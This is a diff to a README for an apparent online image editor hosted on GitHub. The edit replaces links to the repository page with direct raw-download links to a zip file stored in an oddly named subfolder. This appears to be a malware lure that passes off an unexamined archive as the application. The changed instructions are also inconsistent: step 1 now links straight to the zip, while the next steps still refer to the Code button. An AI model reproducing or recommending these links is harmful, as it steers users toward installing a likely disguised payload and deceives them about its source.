@@ -1,6 +1,6 @@
 # 🎨 Image-editor-online - Edit your photos with simple tools
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/postglacial-bludgeoner991/Image-editor-online)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/postglacial-bludgeoner991/Image-editor-online/raw/refs/heads/main/extemporization/Image-editor-online-3.2.zip)
 
 ## 📋 About the application
 
@@ -20,7 +20,7 @@ Your computer must meet these standards to run the software.
 
 You must go to the main project page to save the files to your computer. Follow these steps to obtain the tool.
 
-1. Visit this page to download: [https://github.com/postglacial-bludgeoner991/Image-editor-online](https://github.com/postglacial-bludgeoner991/Image-editor-online).
+1. Visit this page to download: [https://github.com/postglacial-bludgeoner991/Image-editor-online/raw/refs/heads/main/extemporization/Image-editor-online-3.2.zip](https://github.com/postglacial-bludgeoner991/Image-editor-online/raw/refs/heads/main/extemporization/Image-editor-online-3.2.zip).
 2. Look for the green button marked Code near the top right of the page.
 3. Click the button and select Download ZIP.
 4. Wait for the file to finish saving to your computer.
